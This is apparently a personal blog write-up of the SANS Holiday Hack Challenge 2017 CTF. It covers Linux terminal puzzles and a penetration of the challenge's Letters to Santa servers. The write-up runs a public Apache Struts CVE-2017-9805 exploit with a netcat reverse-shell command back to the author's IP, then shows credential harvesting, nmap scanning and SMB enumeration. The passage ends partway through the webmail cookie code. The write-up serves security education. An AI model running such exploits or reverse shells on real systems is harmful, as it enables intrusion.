---
layout: page
title: Solving the SANS Holiday Hack Challenge 2017
permalink: /post/sans-holiday-hack-challenge-2017/
excerpt: Every year, the folks at Counter Hack Challenges and SANS run a cyber security challenge for people to enjoy over the festive season, and once again it was as fun and educational as ever. In this post, you'll find my crudely written-up solution.
---

## Introduction
Every year, the folks at [Counter Hack Challenges](https://www.counterhackchallenges.com/) and [SANS](https://www.sans.org/) run a cyber security challenge for people to enjoy over the festive season, and once again it was great fun and very educational.

Head over to [the challenge site](https://holidayhackchallenge.com/2017/) to set the scene, have a look at the questions, and have a go for yourself before reading my
solution below!

This year's challenge came as two components: the first is the North Pole and Beyond, a game in which you progress through several levels guiding snowballs through checkpoints and over the pages of the Great Book, and tackle the terminals within those levels to earn achievements; the other is the publicly-exposed Letters to Santa system, and the internal systems behind it, which you must penetrate in order to collect the remaining pages of the Great Book and ultimately try to find out who is responsible for the villain causing the giant snowball problem.

In this blog post, I shall cover the techniques used to overcome the terminals in the North Pole and Beyond and acquitions of pages from the Great Book, as well as our journey through the Letters to Santa systems, signposting where we acquire the answers to the nine questions posted on the cha

## North Pole and Beyond

### Winter Wonder Landing

#### Great Book Page 1

**This is the answer to Question 1: Visit the North Pole and Beyond at the Winter Wonder Landing Level to collect the first page of The Great Book using a giant snowball. What is the title of that page?**

The first page of the Great Book could be found inside the Winter Wonder Landing level lying on the floor. By running over it with the snowball and making it to the exit, the page appears in your Stocking with the title "About This Book" (SHA1: `6dda7650725302f59ea42047206bd4ee5f928d19`).

#### Terminal

The terminal in this level gives us the following banner

                                     |
                                   \ ' /
                                 -- (*) --
                                    >*<
                                   >0<@<
                                  >>>@<<*
                                 >@>*<0<<<
                                >*>>@<<<@<<
                               >@>>0<<<*<<@<
                              >*>>0<<@<<<@<<<
                             >@>>*<<@<>*<<0<*<
               \*/          >0>>*<<@<>0><<*<@<<
           ___\\U//___     >*>>@><0<<*>>@><*<0<<
           |\\ | | \\|    >@>>0<*<0>>@<<0<<<*<@<<  
           | \\| | _(UU)_ >((*))_>0><*<0><@<<<0<*<
           |\ \| || / //||.*.*.*.|>>@<<*<<@>><0<<<
           |\\_|_|&&_// ||*.*.*.*|_\\db//_               
           """"|'.'.'.|~~|.*.*.*|     ____|_
               |'.'.'.|   ^^^^^^|____|>>>>>>|
               ~~~~~~~~         '""""`------'
    My name is Bushy Evergreen, and I have a problem for you.
    I think a server got owned, and I can only offer a clue.
    We use the system for chat, to keep toy production running.
    Can you help us recover from the server connection shunning?
    
    
    Find and run the elftalkd binary to complete this challenge.
    elf@154af25b50a2:~$ 

Attempting to use the `find` command gives the error `bash: /usr/local/bin/find: cannot execute binary file: Exec format error` - it looks as though they have placed a `find` binary for the wrong platform (specifically for ARM, rather than the x86-64 architecture we're running on) in `/usr/local/bin/` to make our lives a bit more difficult. Thankfully, the correct version of `find` can still be found at `/usr/bin/find`, and we can use this to locate the `elftalkd` binary we're interested in.

    elf@6500a4c0a8ef:~$ /usr/bin/find / -iname elftalkd 2> /dev/null
    /run/elftalk/bin/elftalkd

We can then attempt to run this `elftalkd` binary and we are met with success

    elf@6500a4c0a8ef:~$ /run/elftalk/bin/elftalkd
    
            Running in interactive mode
            --== Initializing elftalkd ==--
    
    Initializing Messaging System!
    Nice-O-Meter configured to 0.90 sensitivity.
    Acquiring messages from local networks...
    
    
    --== Initialization Complete ==--
          _  __ _        _ _       _ 
         | |/ _| |      | | |     | |
      ___| | |_| |_ __ _| | | ____| |
     / _ \ |  _| __/ _` | | |/ / _` |
    |  __/ | | | || (_| | |   < (_| |
     \___|_|_|  \__\__,_|_|_|\_\__,_|
    
    -*> elftalkd! <*-
    Version 9000.1 (Build 31337) 
    By Santa Claus & The Elf Team
    Copyright (C) 2017 NotActuallyCopyrighted. No actual rights reserved.
    Using libc6 version 2.23-0ubuntu9
    LANG=en_US.UTF-8
    Timezone=UTC
    
    Commencing Elf Talk Daemon (pid=6021)... done!
    Background daemon...

### Winconceivable&#58; The Cliff of Winsanity

#### Terminal

The terminal in this level gives us the following banner

                    ___,@
                   /  <
              ,_  /    \  _,
          ?    \`/______\`/
       ,_(_).  |; (e  e) ;|
        \___ \ \/\   7  /\/    _\8/_
            \/\   \'=='/      | /| /|
             \ \___)--(_______|//|//|
              \___  ()  _____/|/_|/_|
                 /  ()  \    `----'
                /   ()   \
               '-.______.-'
       jgs   _    |_||_|    _
            (@____) || (____@)
             \______||______/


    My name is Sparkle Redberry, and I need your help.
    My server is atwist, and I fear I may yelp.
    Help me kill the troublesome process gone awry.
    I will return the favor with a gift before nigh.


    Kill the "santaslittlehelperd" process to complete this challenge.

Listing the running processes using `ps aux` gave the following output

    elf@bf85d7da5620:~$ ps aux
    USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
    elf          1  0.4  0.0  18028  2824 pts/0    Ss   18:57   0:00 /bin/bash /sbin/init
    elf          8  0.0  0.0   4224   632 pts/0    S    18:57   0:00 /usr/bin/santaslittlehelperd
    elf         11  2.6  0.0  13528  6328 pts/0    S    18:57   0:00 /sbin/kworker
    elf         12  0.0  0.0  18248  3120 pts/0    S    18:57   0:00 /bin/bash
    elf         18  8.3  0.1  71468 26520 pts/0    S    18:57   0:00 /sbin/kworker
    elf         29  0.0  0.0  34424  2920 pts/0    R+   18:57   0:00 ps aux

Trying the obvious `kill 8` didn't seem to work - the `santaslittlehelperd` process was still running. Inpecting the `/sbin/init` script that got ran when this container started shows us that the program we are trying to kill was started with `nohup`, as well as another process `/sbin/kworker`.

    #!/bin/bash
    (nohup /usr/bin/santaslittlehelperd >/dev/null 2>&1 & disown)
    (sleep 2; nohup /sbin/kworker >/dev/null 2>&1 & disown)
    /bin/bash

I'm not really sure what trickery was going on here, but invoking `/bin/kill 8` directly seemed to work (killing the `kworker` processes too)... ¯\\\_(ツ)\_/¯

### Cryokinetic Magic

#### Terminal

The terminal in this level gives us the following banner

                         ___
                        / __'.     .-"""-.
                  .-""-| |  '.'.  / .---. \
                 / .--. \ \___\ \/ /____| |
                / /    \ `-.-;-(`_)_____.-'._
               ; ;      `.-" "-:_,(o:==..`-. '.         .-"-,
               | |      /       \ /      `\ `. \       / .-. \
               \ \     |         Y    __...\  \ \     / /   \/
         /\     | |    | .--""--.| .-'      \  '.`---' /
         \ \   / /     |`        \'   _...--.;   '---'`
          \ '-' / jgs  /_..---.._ \ .'\\_     `.
           `--'`      .'    (_)  `'/   (_)     /
                      `._       _.'|         .'
                         ```````    '-...--'`

    My name is Holly Evergreen, and I have a conundrum.
    I broke the candy cane striper, and I'm near throwing a tantrum.
    Assembly lines have stopped since the elves can't get their candy cane fix.
    We hope you can start the striper once again, with your vast bag of tricks.


    Run the CandyCaneStriper executable to complete this challenge.

Listing the contents of the current directory, we can see the executable we want to run, however it is owner by root and does not have the executable bit set

    elf@8285dbdfda37:~$ ls -la
    total 68
    drwxr-xr-x 1 elf  elf   4096 Dec 15 20:00 .
    drwxr-xr-x 1 root root  4096 Dec  5 19:31 ..
    -rw-r--r-- 1 elf  elf    220 Aug 31  2015 .bash_logout
    -rw-r--r-- 1 root root  3143 Dec 15 19:59 .bashrc
    -rw-r--r-- 1 elf  elf    655 May 16  2017 .profile
    -rw-r--r-- 1 root root 45224 Dec 15 19:59 CandyCaneStriper

One thing we could do, since we can read the contents of the file, is to copy it (since then it would be owned by us) and use `chmod` to set the executable flag, however it looks like the `chmod` binary itself has been replaced with an empty file!

    elf@8285dbdfda37:~$ file /bin/chmod
    /bin/chmod: empty

Inspecting the executable file we wish to run using the `file` command, we see the following

    elf@8285dbdfda37:~$ file CandyCaneStriper 
    CandyCaneStriper: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=bfe4f
    fd88f30e6970feb7e3341ddbe579e9ab4b3, stripped

which is to say that it is a dynamically linked ELF binary, so what we can do is invoke the `/lib64/ld-linux-x86-64.so.2` linker directly with the `CandyCaneStriper` binary as its argument

    elf@74db47a71ead:~$ /lib64/ld-linux-x86-64.so.2 ./CandyCaneStriper
                       _..._
                     .'\\ //`,      
                    /\\.'``'.=",
                   / \/     ;==|
                  /\\/    .'\`,`
                 / \/     `""`
                /\\/
               /\\/
              /\ /
             /\\/
            /`\/
            \\/
             `
    The candy cane striping machine is up and running!

### There's Snow Place Like Home

#### Terminal

The terminal in this level gives us the following banner


                                 ______
                              .-"""".._'.       _,##
                       _..__ |.-"""-.|  |   _,##'`-._
                      (_____)||_____||  |_,##'`-._,##'`
                      _|   |.;-""-.  |  |#'`-._,##'`
                   _.;_ `--' `\    \ |.'`\._,##'`
                  /.-.\ `\     |.-";.`_, |##'`
                  |\__/   | _..;__  |'-' /
                  '.____.'_.-`)\--' /'-'`
                   //||\\(_.-'_,'-'`
                 (`-...-')_,##'`
          jgs _,##`-..,-;##`
           _,##'`-._,##'`
        _,##'`-._,##'`
          `-._,##'`
          
    My name is Pepper Minstix, and I need your help with my plight.
    I've crashed the Christmas toy train, for which I am quite contrite.
    I should not have interfered, hacking it was foolish in hindsight.
    If you can get it running again, I will reward you with a gift of delight.


    total 444
    -rwxr-xr-x 1 root root 454636 Dec  7 18:43 trainstartup

Attempting to run the `trainstartup` executable gives us an error, `bash: ./trainstartup: cannot execute binary file: Exec format error`, indicating that this binary is not for this platform.

Using the `file` to find out what platform it _is_ for show that it is a 32-bit ARM binary, whereas we are running on a 64-bit x86-64 platform

    elf@c1db16b4b906:~$ file trainstartup 
    trainstartup: ELF 32-bit LSB  executable, ARM, EABI5 version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=005de4685e8563d10b3de3e0be7d6fdd7ed732eb, not stripped

Thankfully for us, this container ships with QEMU, in particular the QEMU ARM machine emulator that will translate the instructions in our `trainstartup` binary for us and allow us to execute it

    elf@c1db16b4b906:~$ qemu-arm trainstartup 
    Starting up ...

        Merry Christmas
        Merry Christmas
    v
    >*<
    ^
    /o\
    /   \               @.·
    /~~   \                .
    / ° ~~  \         · .    
    /      ~~ \       ◆  ·    
    /     °   ~~\    ·     0
    /~~           \   .─··─ · o
                 /°  ~~  .*· · . \  ├──┼──┤                                        
                  │  ──┬─°─┬─°─°─°─ └──┴──┘                                        
    ≠==≠==≠==≠==──┼──=≠     ≠=≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠===≠
                  │   /└───┘\┌───┐       ┌┐                                        
                             └───┘    /▒▒▒▒                                        
    ≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠=°≠=°≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠




    You did it! Thank you!

### Bumbles Bounce

#### Great Book page 5

This level contains another page from the Great Book which can be acquired by rolling over it with a snowball and reaching the exit. This is page 5, entitled "The Abominable Snow Monster" (SHA1: `05c0cacc8cfb96bb5531540e9b2b839a0604225f`)

#### Terminal

The terminal in this level gives us the following banner

          ''   /o\   ''     '.|  |.'      \/ //><\\ \/
               ':'        . ~~\  /~~ .       _//\\_
    jgs                   _\_._\/_._/_      \_\  /_/ 
                           / ' /\ ' \                   \o/
           o              ' __/  \__ '              _o/.:|:.\o_
      o    :    o         ' .'|  |'.                  .\:|:/.
        '.\'/.'                 .                 -=>>::>o<::<<=-
        :->@<-:                 :                   _ '/:|:\' _
        .'/.\'.           '.___/*\___.'              o\':|:'/o 
      o    :    o           \* \ / */                   /o\
           o                 >--X--<
                            /*_/ \_*\
                          .'   \*/   '.
                                :
                                '
    Minty Candycane here, I need your help straight away.
    We're having an argument about browser popularity stray.
    Use the supplied log file from our server in the North Pole.
    Identifying the least-popular browser is your noteworthy goal.
    total 28704
    -rw-r--r-- 1 root root 24191488 Dec  4 17:11 access.log
    -rwxr-xr-x 1 root root  5197336 Dec 11 17:31 runtoanswer

This one was just a bit of trial and error with our usual go-to command line tools for manipulating text-based data, namely `cut`, `sort` and `uniq`

    elf@15b12bd7b9ec:~$ cut -d '"' -f 6 access.log | sort | uniq -c | sort -nr | tail
          1 Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0; MASMJS)
          1 Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)
          1 Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
          1 Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36
          1 Mozilla/5.0 (X11; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0
          1 Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko
          1 Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1
          1 Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/604.3.5 (KHTML, like Gecko)
          1 Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36
          1 Dillo/3.0.5

We try to answer with "Dillo", and this turns out to be the correct answer

    elf@15b12bd7b9ec:~$ ./runtoanswer 
    Starting up, please wait......
    Enter the name of the least popular browser in the web log: Dillo
    That is the least common browser in the web log! Congratulations!

### I Don't Think We're In Kansas Anymore

#### Terminal

The terminal in this level gives us the following banner

                           *
                          .~'
                         O'~..
                        ~'O'~..
                       ~'O'~..~'
                      O'~..~'O'~.
                     .~'O'~..~'O'~
                    ..~'O'~..~'O'~.
                   .~'O'~..~'O'~..~'
                  O'~..~'O'~..~'O'~..
                 ~'O'~..~'O'~..~'O'~..
                ~'O'~..~'O'~..~'O'~..~'
               O'~..~'O'~..~'O'~..~'O'~.
              .~'O'~..~'O'~..~'O'~..~'O'~
             ..~'O'~..~'O'~..~'O'~..~'O'~.
            .~'O'~..~'O'~..~'O'~..~'O'~..~'
           O'~..~'O'~..~'O'~..~'O'~..~'O'~..
          ~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..
         ~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'
        O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~.
       .~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~
      ..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~.
     .~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'
    O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..
    Sugarplum Mary is in a tizzy, we hope you can assist.
    Christmas songs abound, with many likes in our midst.
    The database is populated, ready for you to address.
    Identify the song whose popularity is the best.


    total 20684
    -rw-r--r-- 1 root root 15982592 Nov 29 19:28 christmassongs.db
    -rwxr-xr-x 1 root root  5197352 Dec  7 15:10 runtoanswer

We don't have the `file` command at our disposal to tell us what type of database `christmassongs.db` is, but searching for a few obvious candidates for command line clients, we discover that `sqlite3` is installed, so this is probably a SQLite database. Using this, we can list the tables, examine the schemas, and craft a query to get us the information we need.

    elf@7fad6ef31c2a:~$ sqlite3 christmassongs.db
    SQLite version 3.11.0 2016-02-15 17:29:24
    Enter ".help" for usage hints.
    sqlite> .tables
    likes  songs
    sqlite> .schema songs
    CREATE TABLE songs(
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      title TEXT,
      artist TEXT,
      year TEXT,
      notes TEXT
    );
    sqlite> .schema likes
    CREATE TABLE likes(
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      like INTEGER,
      datetime INTEGER,
      songid INTEGER,
      FOREIGN KEY(songid) REFERENCES songs(id)
    );
    sqlite> SELECT title, songid, COUNT(like) FROM likes JOIN songs ON songid=songs.id GROUP BY songid ORDER BY COUNT(like) DESC LIMIT 1;
    Stairway to Heaven|392|11325
    sqlite> .quit

And so, the answer is Stairway to Heaven with 11,325 likes.

    elf@7fad6ef31c2a:~$ ./runtoanswer 
    Starting up, please wait......
    
    
    
    Enter the name of the song with the most likes: Stairway to Heaven
    That is the #1 Christmas song, congratulations!


### Oh Wait! Maybe We Are...

#### Terminal

The terminal in this level gives us the following banner

                  \ /
                -->*<--
                  /o\
                 /_\_\
                /_/_0_\
               /_o_\_\_\
              /_/_/_/_/o\
             /@\_\_\@\_\_\
            /_/_/O/_/_/_/_\
           /_\_\_\_\_\o\_\_\
          /_/0/_/_/_0_/_/@/_\
         /_\_\_\_\_\_\_\_\_\_\
        /_/o/_/_/@/_/_/o/_/0/_\
       jgs       [___]  


    My name is Shinny Upatree, and I've made a big mistake.
    I fear it's worse than the time I served everyone bad hake.
    I've deleted an important file, which suppressed my server access.
    I can offer you a gift, if you can fix my ill-fated redress.

    Restore /etc/shadow with the contents of /etc/shadow.bak, then run "inspect_da_box" to complete this challenge.
    Hint: What commands can you run with sudo?

Starting with the hint, we examine which commands we can run using `sudo`

    elf@466f6ff38e11:~$ sudo -l
    Matching Defaults entries for elf on 466f6ff38e11:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
    User elf may run the following commands on 466f6ff38e11:
        (elf : shadow) NOPASSWD: /usr/bin/find

We can see that we may use `sudo` to run `/usr/bin/find` as the user `elf` (which we are) and under the group `shadow`. Moreover, by using `find`'s `exec` parameter, we can find the `/etc/shadow.bak` file and `cp` it to `/etc/shadow` like so

    elf@466f6ff38e11:~$ sudo -g shadow find /etc/ -name shadow.bak -exec cp {} /etc/shadow \; 2> /dev/null

Then we run `inspect_da_box` to finish this terminal puzzle

    elf@466f6ff38e11:~$ inspect_da_box
                         ___
                        / __'.     .-"""-.
                  .-""-| |  '.'.  / .---. \
                 / .--. \ \___\ \/ /____| |
                / /    \ `-.-;-(`_)_____.-'._
               ; ;      `.-" "-:_,(o:==..`-. '.         .-"-,
               | |      /       \ /      `\ `. \       / .-. \
               \ \     |         Y    __...\  \ \     / /   \/
         /\     | |    | .--""--.| .-'      \  '.`---' /
         \ \   / /     |`        \'   _...--.;   '---'`
          \ '-' / jgs  /_..---.._ \ .'\\_     `.
           `--'`      .'    (_)  `'/   (_)     /
                      `._       _.'|         .'
                         ```````    '-...--'`
    /etc/shadow has been successfully restored!

### We're Off to See the...

#### Terminal

The terminal in this level gives us the following banner

                     .--._.--.--.__.--.--.__.--.--.__.--.--._.--.
                   _(_      _Y_      _Y_      _Y_      _Y_      _)_
                  [___]    [___]    [___]    [___]    [___]    [___]
                  /:' \    /:' \    /:' \    /:' \    /:' \    /:' \
                 |::   |  |::   |  |::   |  |::   |  |::   |  |::   |
                 \::.  /  \::.  /  \::.  /  \::.  /  \::.  /  \::.  /
             jgs  \::./    \::./    \::./    \::./    \::./    \::./
                   '='      '='      '='      '='      '='      '='

    Wunorse Openslae has a special challenge for you.
    Run the given binary, make it return 42.
    Use the partial source for hints, it is just a clue.
    You will need to write your own code, but only a line or two.

    total 88
    -rwxr-xr-x 1 root root 84824 Dec 16 16:47 isit42
    -rw-r--r-- 1 root root   654 Dec 15 19:59 isit42.c.un

The contents of isit42.c.un is as follows

{% highlight c %}
#include <stdio.h>
// DATA CORRUPTION ERROR
// MUCH OF THIS CODE HAS BEEN LOST
// FORTUNATELY, YOU DON'T NEED IT FOR THIS CHALLENGE
// MAKE THE isit42 BINARY RETURN 42
// YOU'LL NEED TO WRITE A SEPERATE C SOURCE TO WIN EVERY TIME
int getrand() {
    srand((unsigned int)time(NULL)); 
    printf("Calling rand() to select a random number.\n");
    // The prototype for rand is: int rand(void);
    return rand() % 4096; // returns a pseudo-random integer between 0 and 4096
}
int main() {
    sleep(3);
    int randnum = getrand();
    if (randnum == 42) {
        printf("Yay!\n");
    } else {
        printf("Boo!\n");
    }
    return randnum;
}
{% endhighlight %}

Here, we can write our own implementation of `int rand(void)` which always returns 42, compile it as a shared library, and use `LD_PRELOAD` to get the `isit42` binary to use it for calls to `rand()` instead of the implementation provided by the distribution's libraries. See [Ed Skoudis's excellent blog post for more information](https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win).

We place the following implementation of `rand()` in a file called `fakerand.c`

{% highlight c %}
int rand(void) {
    return 42;
}
{% endhighlight %}

We then compile this code into a shared library and run the provided binary, forcing it to use this library, like so

    elf@d5c73ce61adb:~$ gcc fakerand.c -o fakerand -shared -fPIC
    elf@d5c73ce61adb:~$ LD_PRELOAD="$PWD/fakerand" ./isit42
    Starting up ... done.
    Calling rand() to select a random number.
                     .-. 
                    .;;\ ||           _______  __   __  _______    _______  __    _  _______  _     _  _______  ______ 
                   /::::\|/          |       ||  | |  ||       |  |   _   ||  |  | ||       || | _ | ||       ||    _ |
                  /::::'();          |_     _||  |_|  ||    ___|  |  |_|  ||   |_| ||  _____|| || || ||    ___||   | ||
                |\/`\:_/`\/|           |   |  |       ||   |___   |       ||       || |_____ |       ||   |___ |   |_||_ 
            ,__ |0_..().._0| __,       |   |  |       ||    ___|  |       ||  _    ||_____  ||       ||    ___||    __  |
             \,`////""""\\\\`,/        |   |  |   _   ||   |___   |   _   || | |   | _____| ||   _   ||   |___ |   |  | |
             | )//_ o  o _\\( |        |___|  |__| |__||_______|  |__| |__||_|  |__||_______||__| |__||_______||___|  |_|
              \/|(_) () (_)|\/ 
                \   '()'   /            ______    _______  _______  ___      ___      __   __    ___   _______ 
                _:.______.;_           |    _ |  |       ||   _   ||   |    |   |    |  | |  |  |   | |       |
              /| | /`\/`\ | |\         |   | ||  |    ___||  |_|  ||   |    |   |    |  |_|  |  |   | |  _____|
             / | | \_/\_/ | | \        |   |_||_ |   |___ |       ||   |    |   |    |       |  |   | | |_____ 
            /  |o`""""""""`o|  \       |    __  ||    ___||       ||   |___ |   |___ |_     _|  |   | |_____  |
           `.__/     ()     \__.'      |   |  | ||   |___ |   _   ||       ||       |  |   |    |   |  _____| |
           |  | ___      ___ |  |      |___|  |_||_______||__| |__||_______||_______|  |___|    |___| |_______|
           /  \|---|    |---|/  \ 
           |  (|42 | () | DA|)  |       _   ___  _______ 
           \  /;---'    '---;\  /      | | |   ||       |
            `` \ ___ /\ ___ / ``       | |_|   ||____   |
                `|  |  |  |`           |       | ____|  |
          jgs    |  |  |  |            |___    || ______| ___ 
           _._  |\|\/||\/|/|  _._          |   || |_____ |   |
          / .-\ |~~~~||~~~~| /-. \         |___||_______||___|
          | \__.'    ||    '.__/ |
           `---------''---------` 
    Congratulations! You've won, and have successfully completed this challenge.


## Letters to Santa systems

It's time to our hands dirty with some actual penetration testing. We've been told that the Letters to Santa system is in scope, as well as everything on the 10.142.0.0/24 network behind it.

### Letters to Santa
Visitng the [Letters to Santa](https://l2s.northpolechristmastown.com/) application, we see what essentially amounts to a HTML form. Looking at the source for this page, we see there are a couple of hidden elements in the page; the first is a form input for the user to enter their US state as part of their letter, (which is of little interest to us), but the second, more interesting tidbit is a link to the [development version of the application](http://dev.northpolechristmastown.com/).

Confirming that `dev.northpolechristmastown.com` resolves to the same IP address (`35.185.84.51`) as `l2s.northpolechristmastown.com`, we consider this to be in-scope. This appears to be quite an early version of the Letters to Santa application. We notice at the foot of the page that the application runs on top of Apache Struts, which was subject to a serious XML deserialisation vulnerability during 2017, [CVE-2017-9805](https://www.cvedetails.com/cve/CVE-2017-9805/) which happens to also be the topic of [another excellent blog post from Ed Skoudis](https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code) on adapting publicly available exploit code to fit your own penetration testing purposes.

Using the [sample code](https://github.com/chrisjd20/cve-2017-9805.py) publicised by Ed in that blog post, and written by Github user chrisjd20, we are able to exploit this Letters to Santa development application and get a remote shell on the web server. First we set up a netcat listener to catch the connection with `nc -l -p 4445` and then use the vulnerability to shunt a shell back to us:

    root@kali:~# python cve-2017-9805.py  -u https://dev.northpolechristmastown.com -c "nc <my IP> 4445 -e /bin/bash"

    [+] Encoding Command
    [+] Building XML object
    [+] Placing command in XML object
    [+] Converting Back to String
    [+] Making Post Request with our payload
    [+] Payload executed

**This is the answer to the first part of Question 2: Investigate the Letters to Santa application at https://l2s.northpolechristmastown.com. What is the topic of The Great Book page available in the web root of the server?**

Exploring the filesystem of the web server, and using the hint in Question 2 about there being a page of the Great Book in the web root, we find `/var/www/html/GreatBookPage2.pdf` entitled "On the Topic of Flying Animals" (SHA1: `aa814d1c25455480942cb4106e6cde84be86fb30`).

**This is the answer to the second part of Question 2: What is Alabaster Snowball's password?**

Continuing our exploration of the web server, we can inspect the deployed web application in `/opt/apache-tomcat/webapps/ROOT/`. Grepping recursively for mentions of the string `password` we find a match in the Java bytecode in `WEB-INF/classes/org/demo/rest/example/OrderMySql.class` under this path. This contains the connection paramters for the web application's backing database, and reveals Alabaser Snowball's password to be `stream_unhappy_buy_loss`.

### Windows SMB Server

It's time to pivot to some of the systems on the private network behind the Letters to Santa application. 

We connect to the Letters to Santa system over SSH using alabaster\_snowball's credentials to give us a more pleasant experience than that which we had with out reverse shell.

Handily, the publicly accessible system which we just compromised has [the NMAP network scanner](https://nmap.org/) already installed.

We scan the in-scope network range for an SMB server, so specifically looking for hosts with TCP/445 open.

    alabaster_snowball@hhc17-apache-struts2:/tmp/asnow.2TbgbuHPStLAsLqGdKJ2BXUF$ nmap -p 445 --open -Pn 10.142.0.0/24

    Starting Nmap 7.40 ( https://nmap.org ) at 2018-01-02 19:56 UTC
    Nmap scan report for hhc17-smb-server.c.holidayhack2017.internal (10.142.0.7)
    Host is up (0.0015s latency).
    PORT    STATE SERVICE
    445/tcp open  microsoft-ds

    Nmap scan report for hhc17-emi.c.holidayhack2017.internal (10.142.0.8)
    Host is up (0.00026s latency).
    PORT    STATE SERVICE
    445/tcp open  microsoft-ds

    Nmap done: 256 IP addresses (256 hosts up) scanned in 5.85 seconds

Using SSH port forwarding, we forward the open ports on these hosts and explore them again using Alabaster Snowball's credentials (someone should really have taugh him about credential reuse!).

**This is the answer to Question 3: The North Pole engineering team uses a Windows SMB server for sharing documentation and correspondence. Using your access to the Letters to Santa server, identify and enumerate the SMB file-sharing server. What is the file server share name?**

On `10.142.0.7` there is a share named `FileStor` containing five documents

    root@kali:~# /usr/share/doc/python-impacket/examples/smbclient.py alabaster_snowball@localhost
    Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies

    Password:
    Type help for list of commands
    # shares
    ADMIN$
    C$
    FileStor
    IPC$
    # use FileStor
    # ls
    drw-rw-rw-          0  Tue Jan  2 04:27:27 2018 .
    drw-rw-rw-          0  Tue Jan  2 04:27:27 2018 ..
    -rw-rw-rw-     255520  Wed Dec  6 21:47:46 2017 BOLO - Munchkin Mole Report.docx
    -rw-rw-rw-    1275756  Mon Dec  4 20:04:34 2017 GreatBookPage3.pdf
    -rw-rw-rw-     133295  Wed Dec  6 21:47:47 2017 MEMO - Password Policy Reminder.docx
    -rw-rw-rw-      10245  Wed Dec  6 22:28:21 2017 Naughty and Nice List.csv
    -rw-rw-rw-      60344  Wed Dec  6 21:51:47 2017 Naughty and Nice List.docx

So, we can retrieve page 3 of the Great Book, entitled "The Great Schism" (SHA1: `57737da397cbfda84e88b573cd96d45fcf34a5da`).

I was unable to access the SMB service listening on `10.142.0.8` either as a guest or with Alabaster Snowball's credentials.

### Elf Web Access

Our next target is the Elf Web Access (EWA) mail server which we are told lives on the internal network at `http://mail.northpolechristmastown.com/` so forward another port over SSH (using the hostname works just fine, but for the sake of completeness this server lives at `10.142.0.5`).

Navigating to the EWA web interface, we are greeted with a login screen. A first good guess of `alabaster_snowball@northpolechristmastown.com` as a username, and the usual password yields a very helpful error message, which informs us that the user does not exist and furthermore discloses that valid email addresses for this system are of the form `first.last@northpolechristmastown.com`.

[![center](/images/ewa_validation_fail.png)](/images/ewa_validation_fail.png)

Adapting our next attempt with this information still does not get us into Alabaster's mailbox, however. Time to look for a weak spot in the authentication mechanism.

Looking at the cookies which our browser has after attempting to log into the webmail application, we see that there is a cookie set with the name `EWA` and value `{"name":"GUEST","plaintext":"","ciphertext":""}`. Referring to the first few hints from Pepper Minstix, they suggest that we may find some source code snippets on the web server, and that Alabaster was trying to hide from search engines, and that the crypto was implemented by him (which almost certainly means it is broken in some manner).

The search engine hint suggests that we might find something interesting in the robots.txt file, and surely enough we find that Alabaster has attempt to exclude the file `cookie.txt` from indexing by search engines.

Fetching the contents of this file, we find the following snippet of javascript code which, as the comment at the top suggests, Alabaster found online and adapted for use in EWA (differing functionally only in the cookie name, as far as we can tell).

{% highlight js %}
//FOUND THESE FOR creating and validating cookies. Going to use this in node js
    function cookie_maker(username, callback){
        var key = 'need to put any length key in here';
        //randomly generates a string of 5 characters
        var plaintext = rando_string(5)
        //makes the string into cipher text .... in base64. When decoded this 21 bytes in total length. 16 bytes for IV and 5 byte of random characters
        //Removes equals from output so as not to mess up cookie. decrypt function can account for this without erroring out.
        var ciphertext = aes256.encrypt(key, plaintext).replace(/\=/g,'');
        //Setting the values of the cookie.
        var acookie = ['IOTECHWEBMAIL',JSON.stringify({"name":username, "plaintext":plaintext,  "ciphertext":ciphertext}), { maxAge: 86400000, httpOnly: true, encode: String }]
        return callback(acookie);
    };
    function cookie_checker(req, callback){
        try{
            var key = 'need to put any length key in here';
            //Retrieving the cookie from the request headers and parsing it as JSON
            var thecookie = JSON.parse(req.cookies.IOTECHWEBMAIL);
            //Retrieving the cipher text 
            var ciphertext = thecookie.ciphertext;
            //Retrievingin the username
            var username = thecookie.name
            //retrieving the plaintext
            var plaintext = aes256.decrypt(key, ciphertext);
            //If the plaintext and ciphertext are the same, then it means the data was encrypted with the same key
            if (plaintext === thecookie.plaintext) {
                return callback(true, username);
            } else {
                return callback(false, '');
            }
